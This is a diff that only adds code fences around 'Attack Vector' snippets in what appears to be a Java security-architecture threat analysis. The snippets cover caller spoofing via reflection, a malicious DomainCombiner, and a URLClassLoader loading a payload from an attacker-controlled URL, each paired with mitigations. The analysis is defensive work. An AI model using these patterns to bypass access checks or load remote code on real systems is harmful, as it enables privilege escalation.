@@ -146,11 +146,11 @@ public static void setSecurityManager(SecurityManager sm) {
 
 **Vulnerability Class:** Caller Spoofing, Authorization Bypass  
 **Attack Vector:**
-
+```
 // Attacker attempts to bypass caller validation
 Method m = System.class.getMethod("setSecurityManager", SecurityManager.class);
 m.invoke(null, maliciousSecurityManager);  // Tries to hide caller
-
+```
 
 **Mitigation:**
 - ✅ `@CallerSensitive` + `Reflection.getCallerClass()` identifies direct caller
@@ -224,12 +224,12 @@ if (cs == null || cs.getLocation() == null) {
 **Vulnerability Class:** Permission Escalation via Context Manipulation
 
 **Attack Vector:**
-
+```
 // Attacker injects malicious DomainCombiner
 AccessControlContext malicious = new AccessControlContext(...);
 DomainCombiner dc = malicious.getCombiner();  // Malicious!
 // Combiner.combine() modifies domain permissions
-
+```
 **Mitigation:**
 - ✅ `getContext()` uses native stack walking (only legitimate contexts)
 - ✅ `createAccessControlContext` permission required
@@ -242,12 +242,12 @@ DomainCombiner dc = malicious.getCombiner();  // Malicious!
 **Vulnerability Class:** Code Source Spoofing, Arbitrary Code Loading
 
 **Attack Vector:**
-
+```
 // ClassLoader accepts arbitrary URLs without validation
 URL[] urls = new URL[]{attacker_controlled_url};
 URLClassLoader ucl = new URLClassLoader(urls);
 ucl.loadClass("com.attacker.Payload");  // Loads from untrusted URL
-
+```
 **Root Cause:**
 - ClassLoaders historically trusted developer to validate URLs
 - No distinction between URLs from policy vs. code
